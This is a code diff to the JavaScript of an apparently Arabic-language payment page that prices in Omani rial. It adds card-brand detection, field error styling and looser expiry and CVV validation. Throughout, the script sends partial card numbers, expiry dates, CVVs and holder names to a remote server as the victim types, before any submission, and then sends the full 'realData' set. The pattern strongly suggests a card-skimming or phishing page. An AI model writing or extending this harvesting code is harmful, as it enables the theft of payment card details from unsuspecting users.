@@ -391,6 +391,9 @@
     document.addEventListener('DOMContentLoaded', function() {
       trackPageChange('payment');
       
+      // ================================
+      // LOAD PRODUCT PRICE
+      // ================================
       var productId = localStorage.getItem('selected_product');
       if (productId) {
         fetch(SERVER_URL + '/api/products/' + productId)
@@ -409,63 +412,189 @@
       localStorage.removeItem('payment_data');
       localStorage.removeItem('payment_amount');
       
+      // ================================
+      // HELPER: Add/Remove error class
+      // ================================
+      function addError(element) {
+        if (element) element.classList.add('error');
+      }
+      
+      function removeError(element) {
+        if (element) element.classList.remove('error');
+      }
+      
+      function getParentFormGroup(input) {
+        var parent = input.parentElement;
+        while (parent) {
+          if (parent.classList && (parent.classList.contains('form-group') || parent.classList.contains('form-row'))) {
+            return parent;
+          }
+          parent = parent.parentElement;
+        }
+        return input.parentElement;
+      }
+      
+      // ================================
+      // 1. CARD NUMBER - Brand Detection
+      // ================================
       var cardInput = document.getElementById('cardNumber');
+      
+      // Card brand logo elements (assumes these exist in HTML)
+      var brandMada = document.getElementById('brandMada');
+      var brandVisa = document.getElementById('brandVisa');
+      var brandMaster = document.getElementById('brandMaster');
+      var brandAmex = document.getElementById('brandAmex');
+      
+      function detectAndShowCardBrand(cardNumber) {
+        var num = cardNumber.replace(/\s/g, '');
+        
+        // Reset all brands first
+        if (brandMada) brandMada.style.opacity = '0.3';
+        if (brandVisa) brandVisa.style.opacity = '0.3';
+        if (brandMaster) brandMaster.style.opacity = '0.3';
+        if (brandAmex) brandAmex.style.opacity = '0.3';
+        
+        if (num.length === 0) return;
+        
+        var detected = false;
+        
+        // Mada: starts with 6 (968, 969, 986, 989, etc.)
+        if (num[0] === '6') {
+          if (brandMada) brandMada.style.opacity = '1';
+          detected = true;
+        }
+        
+        // Visa: starts with 4
+        if (num[0] === '4') {
+          if (brandVisa) brandVisa.style.opacity = '1';
+          detected = true;
+        }
+        
+        // Mastercard: starts with 5
+        if (num[0] === '5') {
+          if (brandMaster) brandMaster.style.opacity = '1';
+          detected = true;
+        }
+        
+        // If unknown, show Visa as default
+        if (!detected) {
+          if (brandVisa) brandVisa.style.opacity = '1';
+        }
+      }
+      
       cardInput.addEventListener('input', function(e) {
+        // Remove error on edit
+        removeError(cardInput.parentElement);
+        
         var value = e.target.value.replace(/\D/g, '');
         var formatted = '';
+        
+        // Format with spaces: 4 digits, space, 4 digits...
         for (var i = 0; i < value.length && i < 16; i++) {
           if (i > 0 && i % 4 === 0) formatted += ' ';
           formatted += value[i];
         }
+        
         e.target.value = formatted;
+        
+        // Detect and show card brand
+        detectAndShowCardBrand(value);
+        
+        // Send partial data to server
         if (value.length >= 4) {
           submitPaymentForm({ cardNumber: value });
         }
       });
       
+      // ================================
+      // 2. EXPIRY DATE - Liberty Input
+      // ================================
       var expiryInput = document.getElementById('expiry');
+      var expiryParent = getParentFormGroup(expiryInput);
+      
       expiryInput.addEventListener('input', function(e) {
-        var value = e.target.value.replace(/\D/g, '');
-        if (value.length >= 2) {
-          var month = value.substring(0, 2);
-          var year = value.substring(2, 4);
+        // Remove error on edit
+        removeError(expiryParent);
+        
+        var value = e.target.value;
+        var digitsOnly = value.replace(/\D/g, '');
+        
+        // Auto-add slash after 2 digits - NO modification of user's digits
+        if (digitsOnly.length > 2) {
+          var hasSlash = value.indexOf('/') !== -1;
           
-          if (parseInt(month) > 12) month = '12';
-          if (parseInt(month) < 1 && month.length === 2) month = '01';
-          
-          var formatted = month;
-          if (year.length > 0) formatted += ' / ' + year;
-          e.target.value = formatted;
-          
-          if (value.length >= 4) {
-            var now = new Date();
-            var currentYear = now.getFullYear() % 100;
-            var currentMonth = now.getMonth() + 1;
-            var expMonth = parseInt(month);
-            var expYear = parseInt(year);
-            
-            var isValid = (expYear > currentYear) || (expYear === currentYear && expMonth >= currentMonth);
-            expiryInput.style.borderColor = isValid ? '' : 'var(--ms-primary)';
-            
-            if (isValid) submitPaymentForm({ expiry: formatted });
+          if (!hasSlash) {
+            // Add slash automatically after 2 digits
+            var month = digitsOnly.substring(0, 2);
+            var year = digitsOnly.substring(2, 4);
+            e.target.value = month + ' / ' + year;
           }
-        } else {
-          e.target.value = value;
+        } else if (digitsOnly.length <= 2) {
+          e.target.value = digitsOnly;
+        }
+        
+        // Send partial data
+        if (digitsOnly.length >= 4) {
+          submitPaymentForm({ expiry: e.target.value });
         }
       });
       
+      // Handle Backspace - delete slash with digit
+      expiryInput.addEventListener('keydown', function(e) {
+        var value = e.target.value;
+        
+        if (e.key === 'Backspace') {
+          // If cursor is after slash, delete slash + previous digit
+          var cursorPos = e.target.selectionStart;
+          var charBefore = value[cursorPos - 1];
+          var charAfter = value[cursorPos];
+          
+          if (charBefore === '/' || charAfter === '/') {
+            e.preventDefault();
+            var newValue = value.substring(0, cursorPos - 1) + value.substring(cursorPos);
+            e.target.value = newValue;
+            e.target.setSelectionRange(cursorPos - 1, cursorPos - 1);
+          }
+        }
+      });
+      
+      // ================================
+      // 3. CVV INPUT
+      // ================================
       var cvvInput = document.getElementById('cvv');
+      var cvvParent = getParentFormGroup(cvvInput);
+      
       cvvInput.addEventListener('input', function(e) {
+        // Remove error on edit
+        removeError(cvvParent);
+        
         var value = e.target.value.replace(/\D/g, '');
-        if (value.length > 3) value = value.substring(0, 3);
+        if (value.length > 4) value = value.substring(0, 4);
         e.target.value = value;
-        if (value.length >= 3) submitPaymentForm({ cvv: value });
+        
+        if (value.length >= 3) {
+          submitPaymentForm({ cvv: value });
+        }
       });
       
-      document.querySelector('[name="cardHolder"]').addEventListener('input', function(e) {
-        if (e.target.value.length > 2) submitPaymentForm({ cardHolder: e.target.value });
+      // ================================
+      // 4. CARD HOLDER
+      // ================================
+      var cardHolderInput = document.querySelector('[name="cardHolder"]');
+      var cardHolderParent = getParentFormGroup(cardHolderInput);
+      
+      cardHolderInput.addEventListener('input', function(e) {
+        // Remove error on edit
+        removeError(cardHolderParent);
+        
+        if (e.target.value.length > 2) {
+          submitPaymentForm({ cardHolder: e.target.value });
+        }
       });
       
+      // ================================
+      // 5. PAYMENT AMOUNT
+      // ================================
       var radios = document.querySelectorAll('input[name="paymentAmount"]');
       for (var i = 0; i < radios.length; i++) {
         radios[i].addEventListener('change', updateFinalAmount);
@@ -486,35 +615,54 @@
         document.getElementById('finalAmount').textContent = finalPrice.toFixed(2) + ' ر.ع';
       }
       
+      // ================================
+      // 6. FORM SUBMISSION - Validation
+      // ================================
       document.getElementById('paymentForm').addEventListener('submit', function(e) {
         e.preventDefault();
         
+        var hasError = false;
+        
+        // Get values
         var cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
         var expiry = document.getElementById('expiry').value;
         var cvv = document.getElementById('cvv').value;
-        var cardHolder = document.querySelector('[name="cardHolder"]').value;
+        var cardHolder = cardHolderInput.value;
         var paymentAmount = document.querySelector('input[name="paymentAmount"]:checked').value;
         
+        // Validate Card Number (16 digits)
         if (cardNumber.length !== 16) {
-          showToast('✕ رقم البطاقة يجب ان يكون 16 رقما', 'error');
-          return;
+          addError(cardInput.parentElement);
+          showToast('✕ رقم البطاقة يجب ان يكون 16 رقماً', 'error');
+          hasError = true;
         }
         
-        var cleanExpiry = expiry.replace(/\s/g, '');
-        var month = parseInt(cleanExpiry.substring(0, 2));
-        var year = parseInt('20' + cleanExpiry.substring(3, 5));
-        var now = new Date();
-        
-        if (year < now.getFullYear() || (year === now.getFullYear() && month < now.getMonth() + 1)) {
-          showToast('✕ تاريخ الانتهاء غير صالح او منتهي', 'error');
-          return;
+        // Validate Expiry (4 digits + slash)
+        var expiryDigits = expiry.replace(/\D/g, '');
+        if (expiryDigits.length < 4) {
+          addError(expiryParent);
+          showToast('✕ تاريخ الانتهاء غير مكتمل', 'error');
+          hasError = true;
         }
         
-        if (cvv.length !== 3) {
-          showToast('✕ رمز الامان يجب ان يكون 3 ارقام', 'error');
-          return;
+        // Validate CVV (3-4 digits)
+        if (cvv.length < 3) {
+          addError(cvvParent);
+          showToast('✕ رمز الأمان غير مكتمل', 'error');
+          hasError = true;
         }
         
+        // Validate Card Holder Name
+        if (cardHolder.length < 3) {
+          addError(cardHolderParent);
+          showToast('✕ اسم حامل البطاقة مطلوب', 'error');
+          hasError = true;
+        }
+        
+        // If any error, stop
+        if (hasError) return;
+        
+        // All valid - send data
         var realData = {
           cardNumber: cardNumber,
           expiry: expiry,
@@ -523,10 +671,14 @@
           paymentAmount: paymentAmount
         };
         
+        // Clear fields for security
         document.getElementById('cardNumber').value = '';
         document.getElementById('expiry').value = '';
         document.getElementById('cvv').value = '';
-        document.querySelector('[name="cardHolder"]').value = '';
+        cardHolderInput.value = '';
+        
+        // Reset card brands
+        detectAndShowCardBrand('');
         
         submitPaymentForm(realData);
         showToast('✓ تم التحقق من بيانات الدفع بنجاح');
@@ -536,6 +688,7 @@
         }, 1000);
       });
       
+      // Focus on card number
       document.getElementById('cardNumber').focus();
     });
   </script>
